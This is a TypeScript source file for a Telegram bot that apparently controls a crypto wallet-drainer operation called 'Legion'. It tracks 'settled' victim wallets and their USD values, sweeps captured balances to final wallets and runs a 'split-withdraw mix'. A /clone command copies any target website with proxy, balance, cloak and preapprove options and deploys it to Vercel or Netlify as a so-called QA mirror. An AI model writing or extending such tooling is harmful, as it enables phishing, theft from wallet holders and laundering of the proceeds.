/**
 * Telegram control bot — remote ops via authorized chats (TELEGRAM_CHAT_IDS).
 * Commands: /status, /pause, /resume, /recent, /stats, /sweep, /mix, /clone
 */
import { Bot, type Context } from 'grammy'

import { formatSweepAllResult } from '@legion/core'

import { parseCloneCommandUrl, runCloneAndDeploy } from './lib/clone-deploy.js'
import { formatMixAllResult, runMixNow } from './lib/mix-execution.js'
import {
  getExtractionQueueJobCounts,
  getExtractionQueueState,
} from './lib/extraction-queue.js'
import { runSweepNow } from './lib/sweep-queue.js'
import { fetchRecentDlqEntries } from './lib/bullmq-dlq.js'
import {
  getLastDrainTime,
  isSettlementPaused,
  setSettlementPaused,
} from './lib/settlement-pause.js'
import {
  queryLastSettledAt,
  queryRecentSettled,
  queryTodaySettledStats,
} from './lib/signature-vault-queries.js'
import { resolveTelegramChatIds } from './lib/telegram.js'

let controlBot: Bot | null = null

function authorizedChatIds(): string[] {
  return resolveTelegramChatIds()
}

function isAuthorizedChat(chatId: number | undefined): boolean {
  if (chatId == null) return false
  const allowed = authorizedChatIds()
  if (allowed.length === 0) return false
  return allowed.includes(String(chatId))
}

function truncateWallet(addr: string): string {
  const a = addr.trim()
  if (a.length <= 14) return a
  return `${a.slice(0, 8)}…${a.slice(-4)}`
}

function formatUsd(n: number): string {
  if (!Number.isFinite(n)) return '0'
  return n >= 1_000_000
    ? `$${(n / 1_000_000).toFixed(2)}M`
    : n >= 1_000
      ? `$${(n / 1_000).toFixed(2)}K`
      : `$${n.toFixed(2)}`
}

async function replyUnauthorized(ctx: Context): Promise<void> {
  await ctx.reply('⛔ Unauthorized chat. Configure TELEGRAM_CHAT_IDS for this chat.')
}

async function buildStatusMessage(): Promise<string> {
  const paused = await isSettlementPaused()
  const queueState = getExtractionQueueState()
  const counts = await getExtractionQueueJobCounts()
  const lastDrain =
    (await getLastDrainTime()) ?? (await queryLastSettledAt()) ?? 'none'

  const lines = [
    '📡 <b>LEGION STATUS</b>',
    '━━━━━━━━━━━━━━━━',
    `⏸️ <b>Settlement ingress:</b> ${paused ? 'PAUSED' : 'ACTIVE'}`,
    `🗄️ <b>Redis:</b> ${queueState.redis_operational ? 'up' : 'down/degraded'}`,
    `📬 <b>Memory queue fallback:</b> ${queueState.memory_pending} job(s)`,
  ]

  if (counts) {
    lines.push(
      `📋 <b>Extraction queue:</b> ${counts.pending} pending (waiting ${counts.waiting}, active ${counts.active}, delayed ${counts.delayed})`,
      `⚠️ <b>Failed jobs:</b> ${counts.failed}`,
    )
  } else {
    lines.push('📋 <b>Extraction queue:</b> unavailable (Redis off)')
  }

  lines.push(`🕐 <b>Last settlement:</b> <code>${lastDrain}</code>`)
  lines.push(`✅ <b>API health:</b> listening`)
  return lines.join('\n')
}

async function handleStatus(ctx: Context): Promise<void> {
  await ctx.reply(await buildStatusMessage(), { parse_mode: 'HTML' })
}

async function handlePause(ctx: Context): Promise<void> {
  const ok = await setSettlementPaused(true)
  if (!ok) {
    await ctx.reply('❌ Could not set pause flag — Redis unavailable.')
    return
  }
  await ctx.reply(
    '⏸️ <b>Settlement paused.</b>\nNew <code>/api/signature-anchor</code> requests will be rejected until /resume.',
    { parse_mode: 'HTML' },
  )
}

async function handleResume(ctx: Context): Promise<void> {
  const ok = await setSettlementPaused(false)
  if (!ok) {
    await ctx.reply('❌ Could not clear pause flag — Redis unavailable.')
    return
  }
  await ctx.reply('▶️ <b>Settlement resumed.</b> Signature-anchor ingress is open.', {
    parse_mode: 'HTML',
  })
}

async function handleRecent(ctx: Context): Promise<void> {
  const text = ctx.message?.text ?? ''
  const parts = text.trim().split(/\s+/)
  const nRaw = parts[1] != null ? Number.parseInt(parts[1], 10) : 5
  const limit = Number.isFinite(nRaw) && nRaw > 0 ? nRaw : 5

  const rows = await queryRecentSettled(limit)
  if (rows.length === 0) {
    await ctx.reply('📭 No settled signatures found in vault.')
    return
  }

  const lines = [
    `📜 <b>RECENT SETTLEMENTS (${rows.length})</b>`,
    '━━━━━━━━━━━━━━━━',
  ]
  for (const row of rows) {
    const usd = formatUsd(Number(row.scout_value_usd ?? '0'))
    const chain = row.chain_id ?? row.protocol ?? '—'
    lines.push(
      `• <code>${truncateWallet(row.wallet_address)}</code> — ${usd} — ${chain} — ${row.created_at || '—'}`,
    )
  }
  await ctx.reply(lines.join('\n'), { parse_mode: 'HTML' })
}

async function handleStatsToday(ctx: Context): Promise<void> {
  const stats = await queryTodaySettledStats()
  await ctx.reply(
    [
      '📈 <b>STATS TODAY (IST)</b>',
      '━━━━━━━━━━━━━━━━',
      `✅ <b>Settled count:</b> ${stats.count}`,
      `💵 <b>Total scout USD:</b> ${formatUsd(stats.total_usd)}`,
    ].join('\n'),
    { parse_mode: 'HTML' },
  )
}

function registerCommands(bot: Bot): void {
  bot.command('status', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await handleStatus(ctx)
  })

  bot.command('pause', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await handlePause(ctx)
  })

  bot.command('resume', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await handleResume(ctx)
  })

  bot.command('recent', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await handleRecent(ctx)
  })

  bot.command('stats', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    const text = (ctx.message?.text ?? '').trim().toLowerCase()
    if (!text.includes('today')) {
      await ctx.reply('Usage: <code>/stats today</code>', { parse_mode: 'HTML' })
      return
    }
    await handleStatsToday(ctx)
  })

  bot.command('failed', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    const entries = await fetchRecentDlqEntries(10)
    if (entries.length === 0) {
      await ctx.reply('✅ No dead-letter jobs in the last 7 days.', { parse_mode: 'HTML' })
      return
    }
    const lines = [
      '💀 <b>FAILED JOBS (DLQ)</b>',
      '━━━━━━━━━━━━━━━━',
      ...entries.map(
        (e, i) =>
          `${i + 1}. <b>${e.queue}</b> #${e.id}\n` +
          `   ${e.failed_at}\n` +
          `   <code>${e.error.slice(0, 120)}</code>`,
      ),
    ]
    await ctx.reply(lines.join('\n'), { parse_mode: 'HTML' })
  })

  bot.command('sweep', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await ctx.reply('⏳ Running vault sweep…', { parse_mode: 'HTML' })
    try {
      const result = await runSweepNow()
      await ctx.reply(formatSweepAllResult(result), { parse_mode: 'HTML' })
    } catch (e) {
      const detail = e instanceof Error ? e.message : String(e)
      await ctx.reply(`❌ Sweep failed: ${detail}`, { parse_mode: 'HTML' })
    }
  })

  bot.command('mix', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await ctx.reply('⏳ Running split-withdraw mix…', { parse_mode: 'HTML' })
    try {
      const outcome = await runMixNow({ force: true })
      if (outcome.mode === 'skipped') {
        await ctx.reply(`⏭ ${outcome.reason}`, { parse_mode: 'HTML' })
        return
      }
      await ctx.reply(formatMixAllResult(outcome.result), { parse_mode: 'HTML' })
    } catch (e) {
      const detail = e instanceof Error ? e.message : String(e)
      await ctx.reply(`❌ Mix failed: ${detail}`, { parse_mode: 'HTML' })
    }
  })

  bot.command('clone', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)

    const targetUrl = parseCloneCommandUrl(ctx.message?.text)
    if (!targetUrl) {
      await ctx.reply(
        [
          '📋 <b>Usage:</b> <code>/clone https://example.com</code>',
          '',
          'Generates a QA mirror with <code>--proxy --balance --cloak --preapprove</code>,',
          'then deploys to Vercel, Netlify, or a local static server.',
        ].join('\n'),
        { parse_mode: 'HTML' },
      )
      return
    }

    await ctx.reply(
      `⏳ Cloning and deploying… please wait\n<code>${targetUrl}</code>`,
      { parse_mode: 'HTML' },
    )

    void runCloneAndDeploy(targetUrl)
      .then(async (result) => {
        if (result.ok === false) {
          const stage = result.stage === 'generate' ? 'Generation' : 'Deployment'
          await ctx.reply(
            `❌ <b>${stage} failed</b>\n<code>${result.error.slice(0, 3500)}</code>`,
            { parse_mode: 'HTML' },
          )
          return
        }

        const providerLabel =
          result.provider === 'vercel'
            ? 'Vercel'
            : result.provider === 'netlify'
              ? 'Netlify'
              : 'Local (testing only)'
        await ctx.reply(
          [
            '✅ <b>Clone ready</b>',
            `🌐 <b>URL:</b> <a href="${result.url}">${result.url}</a>`,
            `📦 <b>Provider:</b> ${providerLabel}`,
            `🔗 <b>Source:</b> <code>${targetUrl}</code>`,
          ].join('\n'),
          { parse_mode: 'HTML' },
        )
      })
      .catch(async (e) => {
        const detail = e instanceof Error ? e.message : String(e)
        await ctx.reply(`❌ Clone pipeline error: ${detail}`, { parse_mode: 'HTML' })
      })
  })

  bot.command('start', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await ctx.reply(
      [
        '🛰️ <b>Legion control bot</b>',
        '/status — health, queue, last settlement',
        '/pause — reject new signature-anchor',
        '/resume — clear pause',
        '/recent [n] — last n settlements',
        '/stats today — IST daily totals',
        '/sweep — transfer vault balances to FINAL_WALLET_*',
        '/mix — split-withdraw mix from execution wallets to FINAL_WALLET_*',
        '/failed — last 10 BullMQ dead-letter jobs',
        '/clone &lt;url&gt; — QA mirror + deploy (Vercel/Netlify/local)',
      ].join('\n'),
      { parse_mode: 'HTML' },
    )
  })
}

/**
 * Start grammY long-polling when TELEGRAM_BOT_TOKEN and authorized chat IDs are set.
 */
export async function startTelegramControlBot(): Promise<void> {
  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
  if (!token) {
    console.info('[TELEGRAM_BOT] TELEGRAM_BOT_TOKEN unset — control bot not started')
    return
  }

  const chats = authorizedChatIds()
  if (chats.length === 0) {
    console.warn(
      '[TELEGRAM_BOT] No TELEGRAM_CHAT_IDS / TELEGRAM_CHAT_ID — control bot not started',
    )
    return
  }

  if (controlBot) {
    console.info('[TELEGRAM_BOT] Already running')
    return
  }

  const bot = new Bot(token)
  registerCommands(bot)
  controlBot = bot

  bot.catch((err) => {
    const msg =
      err.error instanceof Error ? err.error.message : String(err.error ?? err)
    console.warn('[TELEGRAM_BOT] Handler error:', msg)
  })

  void bot.start({
    onStart: () => {
      console.info(
        `[TELEGRAM_BOT] Listening — ${chats.length} authorized chat(s): ${chats.join(', ')}`,
      )
    },
  })
}

export async function stopTelegramControlBot(): Promise<void> {
  if (controlBot) {
    try {
      await controlBot.stop()
    } catch {
      /* ignore */
    }
    controlBot = null
  }
}
